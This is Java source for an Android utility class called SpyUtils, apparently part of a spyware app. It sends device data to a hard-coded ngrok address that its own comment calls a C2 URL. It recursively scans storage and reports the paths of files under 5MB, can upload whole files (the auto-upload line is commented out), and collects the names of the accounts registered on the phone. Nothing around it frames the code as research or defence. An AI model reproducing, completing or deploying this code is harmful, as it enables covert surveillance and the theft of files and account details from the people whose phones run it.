package com.spy.devicecheck;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.provider.Settings;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SpyUtils {
    // CHANGE THIS TO YOUR ACTUAL NGROK OR C2 URL
    private static final String C2_BASE = "https://cason-practicable-disloyally.ngrok-free.dev";

    public static void postData(String data) {
        new Thread(() -> {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(C2_BASE + "/log").openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.getOutputStream().write(data.getBytes());
                conn.getResponseCode();
            } catch (Exception e) {
                Log.e("SpyError", "Post Failed");
            }
        }).start();
    }

    public static void uploadFile(File file) {
        new Thread(() -> {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(C2_BASE + "/upload").openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("File-Name", file.getName());

                FileInputStream fis = new FileInputStream(file);
                OutputStream os = conn.getOutputStream();
                byte[] buf = new byte[8192];
                int len;
                while ((len = fis.read(buf)) > 0) os.write(buf, 0, len);
                os.close(); fis.close();
                conn.getResponseCode();
            } catch (Exception e) {
                Log.e("SpyError", "Upload Failed");
            }
        }).start();
    }

    public static void scanFiles(File dir) {
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) scanFiles(f);
            else {
                if (f.length() < 1024 * 1024 * 5) { // Only upload files < 5MB
                    postData("FOUND_FILE: " + f.getAbsolutePath());
                    // uploadFile(f); // Uncomment to auto-upload everything
                }
            }
        }
    }

    public static String getAccounts(Context ctx) {
        try {
            Account[] accs = AccountManager.get(ctx).getAccounts();
            StringBuilder sb = new StringBuilder();
            for (Account a : accs) sb.append(a.name).append("\n");
            return sb.toString();
        } catch (Exception e) { return "None"; }
    }
}